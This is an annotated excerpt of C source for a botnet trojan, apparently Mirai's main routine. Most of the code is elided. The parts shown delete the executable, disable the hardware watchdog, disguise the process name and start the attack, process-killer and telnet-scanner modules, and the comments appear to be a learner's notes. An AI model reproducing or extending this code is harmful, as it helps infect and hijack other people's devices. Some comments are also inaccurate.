...
#include <sys/ioctl.h>
#include <time.h>
#include <errno.h>		//errno is a standard librrary int used for error checking
...
int main(int argc, char **args)
{
	...
	// Delete self
	unlink(args[0]);		//unlink() deletes the filepath. args[] is an array of the arguments that are passed to the process upon start, args[0] is the path to the process, therefore this line deletes the path to the executable thus hiding the trojan
	...
	if ((wfd = open("/dev/watchdog", 2)) != -1 ||		//wfd = wait for done, opens the watchdog file
		(wfd = open("/dev/misc/watchdog", 2)) != -1)
	{
		int one = 1;

		ioctl(wfd, 0x80045704, &one);		//ioctl() = in out control. the hex is a code that dissables watchdog 
		close(wfd);
		wfd = 0;
	}
	chdir("/");
	...
	// Hide argv0
	name_buf_len = ((rand_next() % 4) + 3) * 4;			//stuff to further hide process
	...
	attack_init();		//fills a table with the possible attacks
	killer_init();		//starts a child process to kill other processes that could stop the trojan
#ifndef DEBUG
#ifdef MIRAI_TELNET
	scanner_init();
#endif
